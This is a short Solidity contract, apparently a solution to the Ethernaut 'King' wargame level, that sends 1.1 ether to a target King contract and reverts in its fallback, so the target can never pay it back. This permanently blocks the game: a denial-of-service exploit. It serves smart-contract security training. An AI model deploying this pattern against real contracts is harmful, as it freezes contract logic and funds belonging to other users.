// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        payable(address(contractAddress)).call{value: 1.1 ether}("");

        // payable(address(contractAddress)).send(1 ether);
        // payable(address(contractAddress)).transfer(1 ether);
    }

    fallback() external payable {
        assert(false);
    }
}
